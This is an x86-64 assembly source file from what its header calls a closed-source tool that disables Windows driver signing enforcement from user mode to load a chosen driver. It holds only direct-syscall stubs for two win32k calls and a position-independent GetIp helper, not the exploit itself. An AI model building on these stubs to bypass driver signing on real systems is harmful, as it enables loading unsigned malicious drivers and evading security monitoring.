;;
;; Disables driver signing enforcement from
;; usermode, and loads a requested driver
;; into memory.
;;
;; Do to the lack of a driver and usage of
;; a userland bug, this project remains 
;; closed source.
;;
[BITS 64]

GLOBAL NtUserSetInformationThread
GLOBAL NtUserHardErrorControl
GLOBAL Leave
GLOBAL GetIp

EXTERN NtUserSetInformationThreadId
EXTERN NtUserHardErrorControlId

[SECTION .text$E]

NtUserSetInformationThread:
	;;
	;; Save the registeres
	;;
	push	rcx
	push	rdx
	push	r8
	push	r9

	;;
	;; Get the syscall number.
	;;
	call	NtUserSetInformationThreadId

	;;
	;; Restore the registers
	;;
	pop	r9
	pop	r8
	pop	rdx
	pop	rcx

	;;
	;; Exec
	;;
	mov	r10, rcx
	syscall
	ret

NtUserHardErrorControl:
	;;
	;; Save the registers
	;;
	push	rcx
	push	rdx
	push	r8
	push	r9

	;;
	;; Get the syscall number.
	;;
	call	NtUserHardErrorControlId

	;;
	;; Restore the registeres
	;;
	pop	r9
	pop	r8
	pop	rdx
	pop	rcx

	;;
	;; Exec
	;;
	mov	r10, rcx
	syscall
	ret

GetIp:
	;;
	;; Execute next instruction
	;;
	call	get_ret_ptr

get_ret_ptr:
	;;
	;; Pop address of stack
	;;
	pop	rax
	sub	rax, 5
	ret
